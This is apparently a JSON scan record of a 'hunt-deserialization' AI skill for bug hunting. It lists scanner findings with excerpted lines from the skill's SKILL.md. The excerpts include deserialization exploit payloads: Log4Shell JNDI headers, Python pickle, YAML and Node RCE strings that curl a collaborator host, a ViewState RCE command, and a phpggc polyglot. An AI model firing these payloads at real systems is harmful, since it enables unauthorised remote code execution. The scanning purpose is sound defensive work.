@@ -1,0 +1,258 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~hunt-deserialization",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/hunt-deserialization",
+  "name": "hunt-deserialization",
+  "description": "Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "d4e4e044dd6d12682511427affb2f1758aca80ac7f6b1f033887e7411d2265e7",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 17,
+        "excerpt": "- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 28,
+        "excerpt": "# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 35,
+        "excerpt": "curl -sI https://$TARGET/ | grep -i \"Set-Cookie.*rememberMe\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 38,
+        "excerpt": "curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 56,
+        "excerpt": "# Install ysoserial",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 57,
+        "excerpt": "wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "github.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 61,
+        "excerpt": "'curl http://COLLAB_HOST/ysoserial' | base64 -w0",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "collab_host"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 65,
+        "excerpt": "curl -s https://$TARGET/wls-wsat/CoordinatorPortType \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 75,
+        "excerpt": "# Find unserialize() calls in source",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 90,
+        "excerpt": "# Generate OOB payload",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 95,
+        "excerpt": "return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "collab_host"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 100,
+        "excerpt": "curl -s https://$TARGET/api/load-model \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 108,
+        "excerpt": "phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 112,
+        "excerpt": "`!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$collab"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 114,
+        "excerpt": "`{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()\"}`",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$collab"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 114,
+        "excerpt": "`{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()\"}`",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 118,
+        "excerpt": "# Check if ViewState is unsigned (MAC disabled)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 123,
+        "excerpt": "-c \"cmd /c curl http://COLLAB_HOST/viewstate-rce\" -o base64",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "collab_host"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 128,
+        "excerpt": "# Test all user-controlled inputs",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 131,
+        "excerpt": "curl -s https://$TARGET/ -H \"$HEADER: \\${jndi:dns://$COLLAB/$HEADER}\" &",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 135,
+        "excerpt": "curl -s -X POST https://$TARGET/api/login \\",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 142,
+        "excerpt": "# Look for Marshal.load in source",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/hunt-deserialization/SKILL.md",
+        "line": 164,
+        "excerpt": "# OOB listener",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 11,
+      "network": 12
+    },
+    "score": 90,
+    "band": "low",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 90,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
